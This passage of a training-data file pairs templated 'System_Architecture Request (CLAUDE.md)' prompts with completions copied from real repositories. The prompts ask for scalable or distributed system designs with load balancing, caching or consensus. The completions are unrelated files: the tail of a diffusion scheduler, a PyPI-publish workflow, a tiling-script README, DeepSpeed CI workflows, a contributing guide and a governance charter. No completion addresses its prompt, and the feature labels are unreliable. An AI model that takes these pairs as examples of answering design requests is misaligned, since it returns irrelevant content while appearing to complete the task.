(`torch.Generator`, *optional*):\r\n                A random number generator.\r\n            variance_noise (`torch.Tensor`):\r\n                Alternative to generating noise with `generator` by directly providing the noise for the variance\r\n                itself. Useful for methods such as [`LEdits++`].\r\n            return_dict (`bool`):\r\n                Whether or not to return a [`~schedulers.scheduling_utils.SchedulerOutput`] or `tuple`.\r\n\r\n        Returns:\r\n            [`~schedulers.scheduling_utils.SchedulerOutput`] or `tuple`:\r\n                If return_dict is `True`, [`~schedulers.scheduling_utils.SchedulerOutput`] is returned, otherwise a\r\n                tuple is returned where the first element is the sample tensor.\r\n\r\n        \"\"\"\r\n        if self.num_inference_steps is None:\r\n            raise ValueError(\r\n                \"Number of inference steps is 'None', you need to run 'set_timesteps' after creating the scheduler\"\r\n            )\r\n\r\n        if self.step_index is None:\r\n            self._init_step_index(timestep)\r\n\r\n        # Improve numerical stability for small number of steps\r\n        lower_order_final = (self.step_index == len(self.timesteps) - 1) and (\r\n            self.config.euler_at_final\r\n            or (self.config.lower_order_final and len(self.timesteps) < 15)\r\n            or self.config.final_sigmas_type == \"zero\"\r\n        )\r\n        lower_order_second = (\r\n            (self.step_index == len(self.timesteps) - 2) and self.config.lower_order_final and len(self.timesteps) < 15\r\n        )\r\n\r\n        model_output = self.convert_model_output(model_output, sample=sample)\r\n        for i in range(self.config.solver_order - 1):\r\n            self.model_outputs[i] = self.model_outputs[i + 1]\r\n        self.model_outputs[-1] = model_output\r\n\r\n        # Upcast to avoid precision issues when computing prev_sample\r\n        sample = sample.to(torch.float32)\r\n        if self.config.algorithm_type in [\"sde-dpmsolver\", \"sde-dpmsolver++\"] and variance_noise is None:\r\n            noise = randn_tensor(\r\n                model_output.shape, generator=generator, device=model_output.device, dtype=torch.float32\r\n            )\r\n        elif self.config.algorithm_type in [\"sde-dpmsolver\", \"sde-dpmsolver++\"]:\r\n            noise = variance_noise.to(device=model_output.device, dtype=torch.float32)\r\n        else:\r\n            noise = None\r\n\r\n        if self.config.solver_order == 1 or self.lower_order_nums < 1 or lower_order_final:\r\n            prev_sample = self.dpm_solver_first_order_update(model_output, sample=sample, noise=noise)\r\n        elif self.config.solver_order == 2 or self.lower_order_nums < 2 or lower_order_second:\r\n            prev_sample = self.multistep_dpm_solver_second_order_update(self.model_outputs, sample=sample, noise=noise)\r\n        else:\r\n            prev_sample = self.multistep_dpm_solver_third_order_update(self.model_outputs, sample=sample)\r\n\r\n        if self.lower_order_nums < self.config.solver_order:\r\n            self.lower_order_nums += 1\r\n\r\n        # Cast sample back to expected dtype\r\n        prev_sample = prev_sample.to(model_output.dtype)\r\n\r\n        # upon completion increase step index by one\r\n        self._step_index += 1\r\n\r\n        if not return_dict:\r\n            return (prev_sample,)\r\n\r\n        return SchedulerOutput(prev_sample=prev_sample)\r\n\r\n    def add_noise(\r\n        self,\r\n        original_samples: torch.Tensor,\r\n        noise: torch.Tensor,\r\n        timesteps: torch.IntTensor,\r\n    ) -> torch.Tensor:\r\n        # Make sure sigmas and timesteps have the same device and dtype as original_samples\r\n        alpha_t = self.alpha_t.to(device=original_samples.device, dtype=original_samples.dtype)\r\n        sigma_t = self.sigma_t.to(device=original_samples.device, dtype=original_samples.dtype)\r\n        timesteps = timesteps.to(original_samples.device)\r\n        alpha_t = alpha_t[timesteps].flatten()\r\n        while len(alpha_t.shape) < len(original_samples.shape):\r\n            alpha_t = alpha_t.unsqueeze(-1)\r\n\r\n        sigma_t = sigma_t[timesteps].flatten()\r\n        while len(sigma_t.shape) < len(original_samples.shape):\r\n            sigma_t = sigma_t.unsqueeze(-1)\r\n        noisy_samples = alpha_t * original_samples + sigma_t * noise\r\n        return noisy_samples\r\n    \r\n    def get_velocity(self, original_samples: torch.Tensor, noise: torch.Tensor, timesteps: torch.IntTensor) -> torch.Tensor:\r\n        alpha_t = self.alpha_t.to(device=original_samples.device, dtype=original_samples.dtype)\r\n        sigma_t = self.sigma_t.to(device=original_samples.device, dtype=original_samples.dtype)\r\n        timesteps = timesteps.to(original_samples.device)\r\n        alpha_t = alpha_t[timesteps].flatten()\r\n        while len(alpha_t.shape) < len(original_samples.shape):\r\n            alpha_t = alpha_t.unsqueeze(-1)\r\n\r\n        sigma_t = sigma_t[timesteps].flatten()\r\n        while len(sigma_t.shape) < len(original_samples.shape):\r\n            sigma_t = sigma_t.unsqueeze(-1)\r\n\r\n        velocity = alpha_t * noise - sigma_t * original_samples\r\n        return velocity\r\n\r\n    def __len__(self):\r\n        return self.config.num_train_timesteps\r\n", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/schedule/dpm_solver.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 970}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This workflow will upload a Python Package using Twine when a release is created\n# For more information see: https://help.github.com/en/actions/language-and-framework-guides/using-python-with-github-actions#publishing-to-package-registries\n\nname: Upload Python Package\n\non:\n  release:\n    types: [published]\n\npermissions:\n  contents: read\n\njobs:\n  deploy:\n\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: actions/checkout@v4\n    - name: Set up Python\n      uses: actions/setup-python@v5\n      with:\n        python-version: '3.x'\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install build\n    - name: Build package\n      run: python -m build\n    - name: Publish package\n      uses: pypa/gh-action-pypi-publish@release/v1\n      with:\n        user: __token__\n        password: ${{ secrets.PYPI_API_TOKEN }}\n        skip-existing: true\n", "metadata": {"source": "github.com/nwg-piotr/autotiling", "file_path": ".github/workflows/python-publish.yml", "language": "yaml", "complexity": "simple", "star_count": 1026, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 36}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# autotiling\nThis script uses the [i3ipc-python library](https://github.com/altdesktop/i3ipc-python)\nto switch the layout splith/splitv depending on the currently focused window\ndimensions. It works on both sway and i3 window managers.\n\nInspired by https://github.com/olemartinorg/i3-alternating-layout.\n\n## See on YouTube:\n\n[![Auto-tiling in\naction](https://img.youtube.com/vi/UWRZuhn92bQ/0.jpg)](https://www.youtube.com/watch?v=UWRZuhn92bQ)\n\n## PLEASE DO READ THIS\n\nThe script does one thing: it checks the window height / width ratio, and\nexecutes the equivalent of either `swaymsg splitv` or `swaymsg splith`. Nothing\nless, nothing more. This may make stack and tabbed layouts behave oddly.\nUnfortunately, there is nothing that can be done about it – please, do not\nsubmit issues about it –, but there are two workaround that you can try.\n\nOne option is, to enable autotiling on certain workspaces or outputs only.\nFor instance, you could configure autotiling to be enabled on odd workspaces,\nbut not on even ones:\n\n```text\n### Autostart\n  exec_always autotiling -w 1 3 5 7 9\n```\n\nAnother option you can try, is setting `--limit` and only use stacking or\ntabbing on the lowest level. A good place to start would be `--limit 2`. Open\nfour windows with the third and fourth window in the same container as two. This\nmight mimic a master-stack layout, and you should now be able to switch to\nstacking or tabbed. Beware that the decision on how to split is still based on\nthe height / width ratio.\n\n## Installation\n\nThe script has been packaged for the following distributions:\n\n [![Packaging\n status](https://repology.org/badge/vertical-allrepos/autotiling.svg)](https://repology.org/project/autotiling/versions)\n\n [![PyPI version](https://badge.fury.io/py/autotiling.svg)](https://badge.fury.io/py/autotiling)\n\nInstalling manually:\n\n1. Install the `python-i3ipc>=2.0.1` package (or whatever it's called in your Linux\n    distribution);\n2. save the `main.py` file anywhere, rename to `autotiling`, make executable, move to your bin folder;\n3. add `exec_always autotiling` to the `~/.config/sway/config` or `exec_always --no-startup-id\n   autotiling` to the `~/.config/i3/config` file.\n\n## Usage\n\n```text\n$ autotiling -h\nusage: main.py [-h] [-d] [-v] [-o [OUTPUTS ...]] [-w [WORKSPACES ...]]\n               [-l LIMIT] [-sw SPLITWIDTH] [-sh SPLITHEIGHT] [-sr SPLITRATIO]\n               [-e [EVENTS ...]]\n\noptions:\n  -h, --help            show this help message and exit\n  -d, --debug           print debug messages to stderr\n  -v, --version         display version information\n  -o [OUTPUTS ...], --outputs [OUTPUTS ...]\n                        restricts autotiling to certain output; example:\n                        autotiling --output DP-1 HDMI-0\n  -w [WORKSPACES ...], --workspaces [WORKSPACES ...]\n                        restricts autotiling to certain workspaces; example:\n                        autotiling --workspaces 8 9\n  -l LIMIT, --limit LIMIT\n                        limit how often autotiling will split a container; try\n                        \"2\" if you like master-stack layouts; default: 0 (no\n                        limit)\n  -sw SPLITWIDTH, --splitwidth SPLITWIDTH\n                        set the width of the vertical split (as factor);\n                        default: 1.0;\n  -sh SPLITHEIGHT, --splitheight SPLITHEIGHT\n                        set the height of the horizontal split (as factor);\n                        default: 1.0;\n  -sr SPLITRATIO, --splitratio SPLITRATIO\n                        Split direction ratio - based on window height/width;\n                        default: 1;try \"1.61\", for golden ratio - window has\n                        to be 61% wider for left/right split; default: 1.0;\n  -e [EVENTS ...], --events [EVENTS ...]\n                        list of events to trigger switching split orientation;\n                        default: WINDOW MODE\n```\n\n### Events\n\nChanging event subscription has already been the objective of several pull request. To avoid doing this again and again,\nstarting from v1.6 you may specify them in the `-e` | `--events` argument. If no value given, the script will subscribe\nto `Event.WINDOW` and `Event.MODE`, as if it was executed with `autotiling -e WINDOW MODE`. See  \n[altdesktop/i3ipc-python`](https://github.com/altdesktop/i3ipc-python/blob/a670f24e7e04f509de8161cf760afe929c22ae93/i3ipc/events.py#L12) for event enumeration.\n", "metadata": {"source": "github.com/nwg-piotr/autotiling", "file_path": "README.md", "language": "markdown", "complexity": "simple", "star_count": 1026, "quality_score": 0.6599999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": true, "line_count": 97}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: hpu-gaudi2\n\non:\n  workflow_dispatch:\n  schedule:\n    - cron: \"0 0 * * *\"\n  pull_request:\n    paths:\n      - \".github/workflows/hpu-gaudi2.yml\"\n      - \"accelerator/hpu_accelerator.py\"\n      - \"op_builder/hpu/**\"\n      - \"deepspeed/runtime/engine.py\"\n      - \"deepspeed/runtime/bf16_optimizer.py\"\n      - \"deepspeed/runtime/zero/stage_1_and_2.py\"\n      - \"deepspeed/runtime/zero/stage3.py\"\n      - \"deepspeed/runtime/zero/partition_parameters.py\"\n      - \"deepspeed/runtime/zero/partitioned_param_coordinator.py\"\n      - \"deepspeed/runtime/zero/parameter_offload.py\"\n      - \"deepspeed/runtime/pipe/engine.py\"\n      - \"deepspeed/runtime/utils.py\"\n      - \"deepspeed/inference/engine.py\"\n      - \"deepspeed/module_inject/auto_tp.py\"\n      - \"deepspeed/module_inject/replace_module.py\"\n      - \"deepspeed/module_inject/load_checkpoint.py\"\n      - \"deepspeed/module_inject/inject.py\"\n      - \"deepspeed/ops/transformer/**\"\n      - \"deepspeed/ops/adam/**\"\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n\npermissions:\n  contents: read\n  issues: write\n\njobs:\n  unit-tests:\n    # The type of runner that the job will run on\n    runs-on: [self-hosted, intel, gaudi2]\n    container:\n      image: vault.habana.ai/gaudi-docker/1.21.0/ubuntu22.04/habanalabs/pytorch-installer-2.6.0:latest\n      ports:\n        - 80\n      options: --runtime=habana -e HABANA_VISIBLE_DEVICES=all -e OMPI_MCA_btl_vader_single_copy_mechanism=none --cap-add=sys_nice\n\n    env:\n      PT_HPU_LAZY_MODE: 0\n      TORCHINDUCTOR_COMPILE_THREADS: 1\n      TEST_LIST: |\n        test_accelerator.py\n        test_autotuning.py\n        test_compression.py\n        test_dist.py\n        test_elastic.py\n        test_ds_arguments.py\n        test_run.py\n        test_multinode_runner.py\n        test_moe_tp.py\n        test_monitor.py\n        (test_zero_optimizer.py and (TestSaveTensorClone or TestZeRONonDistributed))\n        (test_latest_checkpoint.py and test_missing_latest)\n        test_reshape_checkpoint.py\n        test_shared_weights.py\n        test_sparse.py\n        test_tag_validation.py\n        test_pipe_module.py\n        (test_flops_profiler.py and test_flops_profiler_in_inference)\n        test_get_optim_files.py\n        test_groups.py\n        test_partition_balanced.py\n        (test_adamw.py and TestAdamConfigs)\n        test_coalesced_collectives.py\n        test_activation_checkpointing_non_reentrant.py\n        test_activation_checkpointing.py\n        test_data.py\n        (test_ds_config_dict.py and (TestBasicConfig or TestBatchConfig))\n        test_ds_config_model.py\n        test_mup_optimizers.py\n        (test_pld.py and test_pld_schedule)\n        test_runtime_utils.py\n        test_pipe_schedule.py\n        test_topology.py\n        (test_ds_initialize.py and (TestClientOptimizer or TestClientLrScheduler))\n        test_csr.py\n        (test_fp16.py and (TestZeroEmptyGrad or TestZeroAllowUntestedOptimizer))\n        (test_bf16.py and TestZeroDtypeCocktail)\n        test_partition.py\n        test_ignore_unused_parameters.py\n        test_zero_config.py\n        test_zero_context_ancestry.py\n        (test_zero_context.py and not TestSerialContext)\n        test_zero_dynamic_class.py\n        test_zero_nesting_init.py\n        test_zeropp.py\n        (test_zero.py and (TestZero3ParamPartitioningLargeParam or TestZero3ParamPartitioningLargeParam))\n        (test_linear.py and (TestLoRALinear or TestBasicLinear))\n        (test_ctx.py and TestEngine)\n\n    # Steps represent a sequence of tasks that will be executed as part of the job\n    steps:\n      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it\n      - uses: actions/checkout@v4\n\n      - name: Check container state\n        run: |\n          ldd --version\n          hl-smi -L\n          python -c \"import torch; print('torch:', torch.__version__, torch)\"\n          python -c \"import torch; print('CUDA available:', torch.cuda.is_available())\"\n\n      - name: Install transformers\n        run: |\n          git clone https://github.com/huggingface/transformers\n          cd transformers\n          # if needed switch to the last known good SHA until transformers@master is fixed\n          # git checkout 981c276\n          git rev-parse --short HEAD\n          pip install .\n\n      - name: Install deepspeed\n        run: |\n          pip install .[dev,autotuning]\n          ds_report\n\n      - name: Python environment\n        run: |\n          pip list\n\n      - name: Unit tests\n        run: |\n          unset TORCH_CUDA_ARCH_LIST # only jit compile for current arch\n          cd tests\n          export PT_HPU_LAZY_MODE=${PT_HPU_LAZY_MODE}\n          export TORCHINDUCTOR_COMPILE_THREADS=${TORCHINDUCTOR_COMPILE_THREADS}\n          TEST_LIST=$(echo \"$TEST_LIST\" | awk 'NF{printf \"%s%s\", (NR>1 ? \" or \" : \"\"), $0} END{if (NR>1) print \"\"}')\n          echo \"TEST_LIST ${TEST_LIST}\"\n          pytest --verbose unit/ -k \"${TEST_LIST}\"\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": ".github/workflows/hpu-gaudi2.yml", "language": "yaml", "complexity": "medium", "star_count": 39501, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 139}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: xpu-max1100\n\non:\n  workflow_dispatch:\n  schedule:\n    - cron: \"0 0 * * *\"\n  pull_request:\n    paths:\n      - \".github/workflows/xpu-max1100.yml\"\n      - \"accelerator/xpu_accelerator.py\"\n      - \"accelerator/abstract_accelerator.py\"\n      - \"accelerator/cpu_accelerator.py\"\n      - \"accelerator/real_accelerator.py\"\n      - \"csrc/xpu/**\"\n      - \"deepspeed/runtime/engine.py\"\n      - \"deepspeed/runtime/bf16_optimizer.py\"\n      - \"deepspeed/runtime/zero/stage_1_and_2.py\"\n      - \"deepspeed/runtime/zero/stage3.py\"\n      - \"deepspeed/runtime/zero/partition_parameters.py\"\n      - \"deepspeed/runtime/zero/partitioned_param_coordinator.py\"\n      - \"deepspeed/runtime/zero/parameter_offload.py\"\n      - \"deepspeed/runtime/pipe/engine.py\"\n      - \"deepspeed/runtime/utils.py\"\n      - \"op_builder/xpu/**\"\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n\npermissions:\n  contents: read\n  issues: write\n\n\njobs:\n  unit-tests:\n    runs-on: [self-hosted, intel, xpu]\n    container:\n      image: intel/oneapi-basekit:2025.0.2-0-devel-ubuntu22.04\n      ports:\n        - 80\n      options: --privileged -it --rm --device /dev/dri:/dev/dri -v /dev/dri/by-path:/dev/dri/by-path --ipc=host --cap-add=ALL\n\n    steps:\n    - uses: actions/checkout@v4\n    - name: Install prerequisite\n      shell: bash\n      run: |\n        apt-get update\n        apt-get install -y python3.11 python3.11-dev python3-pip clinfo libaio-dev\n        pip install --upgrade pip\n        pip install py-cpuinfo\n        pip install torch==2.7.0 torchvision==0.22.0 torchaudio==2.7.0 --index-url https://download.pytorch.org/whl/xpu\n        pip install intel-extension-for-pytorch==2.7.10+xpu oneccl_bind_pt==2.7.0+xpu --extra-index-url https://pytorch-extension.intel.com/release-whl/stable/xpu/us\n        pip install .[dev,autotuning]\n\n    - name: Check container state\n      shell: bash\n      run: |\n        ldd --version\n        ds_report\n        python3 -c \"import torch; print('torch:', torch.__version__, torch)\"\n        python3 -c \"import torch; import intel_extension_for_pytorch; print('XPU available:', torch.xpu.is_available())\"\n        python3 -c \"from deepspeed.accelerator import get_accelerator; print('accelerator:', get_accelerator()._name)\"\n        pip list\n\n    - name: Unit tests\n      shell: bash\n      run: |\n        cd tests/unit\n        export FI_PROVIDER=\"tcp\"\n        export I_MPI_SHM=off\n        pytest --verbose accelerator/*\n        pytest --verbose autotuning/*\n        pytest --verbose checkpoint/test_reshape_checkpoint.py\n        pytest --verbose checkpoint/test_moe_checkpoint.py\n        pytest --verbose checkpoint/test_shared_weights.py\n        pytest --verbose launcher/test_ds_arguments.py launcher/test_run.py\n        pytest --verbose model_parallelism/*\n        pytest --verbose moe/test_moe_tp.py\n        pytest --verbose monitor/*\n        pytest --verbose utils/*\n        pytest --verbose runtime/test_ds_config_model.py\n        pytest --verbose runtime/pipe/test_pipe_schedule.py\n        pytest --verbose runtime/zero/test_zero_config.py\n        pytest --verbose runtime/zero/test_zero_tiled.py\n        pytest --verbose runtime/zero/test_zeropp.py\n        pytest --verbose runtime/test_autocast.py\n        pytest --verbose runtime/test_data.py\n        pytest --verbose runtime/test_runtime_utils.py\n        pytest --verbose runtime/activation_checkpointing/*\n        pytest --verbose runtime/utils/*\n        pytest --verbose runtime/zero/test_zero_dynamic_class.py\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": ".github/workflows/xpu-max1100.yml", "language": "yaml", "complexity": "simple", "star_count": 39501, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 94}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contributing\nDeepSpeed welcomes your contributions!\n\n## Prerequisites\nDeepSpeed uses [pre-commit](https://pre-commit.com/) to ensure that formatting is\nconsistent across DeepSpeed. First, ensure that `pre-commit` is installed from either\ninstalling DeepSpeed or `pip install pre-commit`. Next, the pre-commit hooks must be\ninstalled once before commits can be made:\n```bash\npre-commit install\n```\n\nAfterwards, our suite of formatting tests run automatically before each `git commit`. You\ncan also run these manually:\n```bash\npre-commit run --files  $(git diff --name-only master)\n```\nIf a formatting test fails, it will fix the modified code in place and abort\nthe `git commit`. After looking over the changes, you can `git add <modified files>`\nand then repeat the previous `git commit` command.\n\nYou can also run:\n```\nmake format\n```\nwhich will do the same as above, and it'll also automatically build a `venv` python environment if you\ndon't already have one, which will isolate the requirements of this project from requirements of other projects.\n\n## Testing\nDeepSpeed tracks two types of tests: unit tests and more costly model convergence tests.\nThe model convergence tests train\n[DeepSpeedExamples](https://github.com/deepspeedai/DeepSpeedExamples/) and measure\nend-to-end convergence and related metrics. Unit tests are found in `tests/unit/` and\nthe model convergence tests are found in `tests/model/`.\n\n### Unit Tests\n[PyTest](https://docs.pytest.org/en/latest/) is used to execute tests. PyTest can be\ninstalled from PyPI via `pip install pytest`. Simply invoke `pytest --forked` to run the\nunit tests:\n```bash\npytest --forked tests/unit/\n```\nYou can also provide the `-v` flag to `pytest` to see additional information about the\ntests. Note that [pytest-forked](https://github.com/pytest-dev/pytest-forked) and the\n`--forked` flag are required to test CUDA functionality in distributed tests.\n\nYou can also run:\n```\nmake test\n```\n\n### Model Tests\nTo execute model tests, first [install DeepSpeed](#installation). The\n[DeepSpeedExamples](https://github.com/deepspeedai/DeepSpeedExamples/) repository is cloned\nas part of this process. Next, execute the model test driver:\n```bash\ncd tests/model/\npytest run_sanity_check.py\n```\nNote that the `--forked` flag is not necessary for the model tests.\n\n## Developer Certificate of Origin\nThis project welcomes contributions and suggestions. All contributions to deepspeedai projects\nrequire commits to be signed off with a [Developer Certificate of Origin](https://en.wikipedia.org/wiki/Developer_Certificate_of_Origin)\n(DCO) declaring that you have the right to, and actually do, grant us the rights to use your contribution.\n\nWhen you submit a pull request, the DCO app will check for the presence of signed commits.\nInformation about how this check works is here: https://github.com/dcoapp/app?tab=readme-ov-file#how-it-works\n\nTo sign commits, you will need to include `-s` when running `git commit`. For example, `git commit -s -m \"Commit message\"`. One note, creating PRs via the GitHub interface do not appear to include this option.  If you forget this, clicking on the failing check in your PR will point you to commands you can run to rebase and sign previous commits.\n\n## Code of Conduct\nThis project has adopted the [Microsoft Open Source Code of\nConduct](https://opensource.microsoft.com/codeofconduct/). For more information see the\n[Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact\n[opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or\ncomments.\n\n## New Feature Contribution Guidelines\nUnlike bug fix or improving existing feature (where users usually directly submit a PR and we review it), adding a new feature to DeepSpeed requires several steps: (1) proposal and discussion, (2) implementation and verification, (3) release and maintenance. This general guideline applies to all new feature contributions. Core DeepSpeed team member contributions may complete step 1 internally.\n\n### Step 1: proposal and discussion\nWe ask users to first post your intended feature in an issue. This issue needs to include:\n\n* A description of the proposed feature.\n* A motivation of why it will be useful to DeepSpeed users.\n* A rough design of how you implement the feature inside DeepSpeed.\n* (Important) Results or planned experiments to demonstrate the effectiveness and correctness of the feature.\n  * If this is a general feature applicable to different tasks, we require testing it on at least one CV task (e.g., [CIFAR](https://www.deepspeed.ai/tutorials/cifar-10/)) and one NLP task (e.g., [SQuAD](https://www.deepspeed.ai/tutorials/bert-finetuning/)). If this is a feature for one kind of task only, it is fine to just test on the specific task.\n  * If the feature only affects performance and does not affect training convergence, we require testing on a fraction of training to demonstrate that the training/validation loss are consistent with baseline, and that the performance is better than baseline.\n  * If the feature does affect training convergence, we require testing the whole training to demonstrate that the feature achieves better/on-par final model quality and training performance compared to baseline.\n\nBased on the issue we shall discuss the merit of the new feature and decide whether accept or decline the proposal. Once accepted and after we confirm the design and implementation plan, we are ready for step 2.\n\n### Step 2: implementation and verification\nContributor will go ahead and implement the feature, and the DeepSpeed team will provide guidance/helps as needed. The required deliverables include:\n\n* A PR to [deepspeedai/DeepSpeed](https://github.com/deepspeedai/DeepSpeed) including (1) the feature implementation (2) unit tests (3) documentation (4) tutorial\n* A PR to [deepspeedai/DeepSpeedExamples](https://github.com/deepspeedai/DeepSpeedExamples) or [deepspeedai/Megatron-DeepSpeed](https://github.com/deepspeedai/Megatron-DeepSpeed) including the examples of how to use the feature (this is related to the planned testing experiments in proposal)\n* In the implementation (code, documentation, tutorial), we require the feature author to record their GitHub username as a contact method for future questions/maintenance.\n\nAfter receiving the PRs, we will review them and merge them after necessary tests/fixes.\n\n### Step 3: release and maintenance\nAfter the PRs are merged, we will announce the feature on our website (with credit to the feature author). We ask the feature author to commit to the maintenance of the feature.\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "medium", "star_count": 39501, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 106}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\n# DeepSpeed Project Charter and Governance\n\nThis charter sets forth the responsibilities and procedures for technical contribution to, and oversight of, the DeepSpeed open source project. All contributors (including committers, maintainers, and other technical positions) and other participants in the Project (collectively, \"Collaborators\") must comply with the terms of this Charter.\n\n## Mission and Scope of the Project\n\nThe mission of the Project is to DeepSpeed is a deep learning optimization library that makes distributed training and inference easy, efficient, and effective.\n\nThe scope of the Project includes collaborative development under the Project License (as defined herein) supporting the mission, including documentation, testing, integration, and the creation of other artifacts that aid the development, deployment, operation, or adoption of the open source project.\n\n## Technical Steering Committee\n\n1. The Technical Steering Committee (the \"TSC\") will be responsible for all technical oversight of the open source Project.\n\n2. The TSC voting members are initially the Project's Committers. At the inception of the project, the Committers of the Project will be as set forth within the \"CONTRIBUTING\" file within the Project's code repository. The TSC may choose an alternative approach for determining the voting members of the TSC, and any such alternative approach will be documented in the CONTRIBUTING file. Any meetings of the Technical Steering Committee are intended to be open to the public, and can be conducted electronically, via teleconference, or in person.\n\n3. TSC projects generally will involve Contributors and Committers. The TSC may adopt or modify roles so long as the roles are documented in the CONTRIBUTING file. Unless otherwise documented:\n\n\t- **Contributors** include anyone in the technical community that contributes code, documentation, or other technical artifacts to the Project.\n\t- **Committers** are Contributors who have earned the ability to modify (\"commit\") source code, documentation, or other technical artifacts in a project's repository.\n\n\t-  A Contributor may become a Committer by a majority approval of the existing Committers. A Committer may be removed by a majority approval of the other existing Committers.\n\n4. Participation in the Project through becoming a Contributor and Committer is open to anyone so long as they abide by the terms of this Charter.\n\n5. The TSC may:\n\t- Establish workflow procedures for the submission, approval, and closure/archiving of projects.\n\t- Set requirements for the promotion of Contributors to Committer status, as applicable.\n\t- Amend, adjust, refine and/or eliminate the roles of Contributors and Committers, and create new roles, and publicly document any TSC roles, as it sees fit.\n\n6. The TSC may elect a TSC Chair, who will preside over meetings of the TSC and will serve until their resignation or replacement by the TSC. The TSC Chair, or any other TSC member so designated by the TSC, will serve as the primary communication contact between the Project and AI & Data, a directed fund of The Linux Foundation.\n\n7. Responsibilities:  The TSC will be responsible for all aspects of oversight relating to the Project, which may include:\n\n\t- Coordinating the technical direction of the Project.\n\t- Approving project or system proposals (including, but not limited to, incubation, deprecation, and changes to a sub-project's scope).\n\t- Organizing sub-projects and removing sub-projects.\n\t- Creating sub-committees or working groups to focus on cross-project technical issues and requirements.\n\t- Appointing representatives to work with other open source or open standards communities.\n\t- Establishing community norms, workflows, issuing releases, and security issue reporting policies.\n\t- Approving and implementing policies and processes for contributing (to be published in the CONTRIBUTING file) and coordinating with the series manager of the Project (as provided for in the Series Agreement, the \"Series Manager\") to resolve matters or concerns that may arise as set forth in Section 7 of this Charter.\n\t- Discussions, seeking consensus, and where necessary, voting on technical matters relating to the code base that affect multiple projects.\n\t- Coordinating any marketing, events, or communications regarding the Project.\n\n## TSC Voting\n\n1. While the Project aims to operate as a consensus-based community, if any TSC decision requires a vote to move the Project forward, the voting members of the TSC will vote on a one vote per voting member basis.\n\n2. Quorum for TSC meetings requires at least fifty percent of all voting members of the TSC to be present. The TSC may continue to meet if quorum is not met but will be prevented from making any decisions at the meeting.\n\n3. Except as provided in Section 7.c. and 8.a, decisions by vote at a meeting require a majority vote of those in attendance, provided quorum is met. Decisions made by electronic vote without a meeting require a majority vote of all voting members of the TSC.\n\n4. In the event a vote cannot be resolved by the TSC, any voting member of the TSC may refer the matter to the Series Manager for assistance in reaching a resolution.\n\n## Compliance with Policies\n\n1. This Charter is subject to the Series Agreement for the 